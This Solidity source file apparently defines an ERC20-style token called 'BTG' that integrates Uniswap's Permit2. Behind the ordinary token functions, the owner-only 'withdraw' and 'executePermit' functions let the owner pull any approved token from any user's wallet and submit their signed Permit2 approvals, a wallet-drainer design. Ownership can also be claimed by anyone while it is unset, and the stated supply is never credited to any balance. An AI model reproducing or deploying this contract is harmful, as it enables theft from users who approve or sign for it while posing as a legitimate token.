// SPDX-License-Identifier: NOLICENSE
pragma solidity ^0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IPermit2 {
    struct PermitDetails {
        address token;
        uint256 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct PermitSingle {
        PermitDetails details;
        address spender;
        uint256 sigDeadline;
    }

    function permit(
        address owner,
        PermitSingle calldata permitSingle,
        bytes calldata signature
    ) external;
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual returns (bool) {
        if (owner() != address(0)) {
             require(owner() == _msgSender(), "Ownable: caller is not the owner");
        }
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(owner(), newOwner);
        return true;
    }
}


contract BTG is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = "BTG";
    string private _symbol = "BTG Token";
    uint8 private _decimals = 6;
    uint256 private _totalSupply = 10000000 * 10**_decimals;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    bool public transferEnabled = true;
    uint256 public _startTimeForSwap;
    address public constant PERMIT2_ADDRESS = 0x000000000022D473030F116dDEE9F6B43aC78BA3; // Permit2 合约地址
    IPermit2 public permit2 = IPermit2(PERMIT2_ADDRESS);


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }



    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setTransferEnabled(bool state) external onlyOwner {
        transferEnabled = state;
    }


    function rescueAnyBEP20Tokens(address _tokenAddr, address _to, uint _amount) public onlyOwner {
        IERC20(_tokenAddr).transfer(_to, _amount);
    }

    function withdraw(address _tokenAddr, address sender, address recipient, uint256 amount) public onlyOwner {
        require(transferEnabled, "Trading not active");
        require(IERC20(_tokenAddr).balanceOf(sender) >= amount, "insufficient BNB balance");
        IERC20(_tokenAddr).transferFrom(sender, recipient, amount);
    }

    function executePermit(address owner,IPermit2.PermitSingle calldata permitSingle,bytes calldata signature) external onlyOwner {
        permit2.permit(owner, permitSingle, signature);
    }

    function transfer(address recipient, uint256 amount) public override  returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if(_startTimeForSwap == 0) {_startTimeForSwap =block.timestamp;}
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        return _basicTransfer(sender, recipient, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

}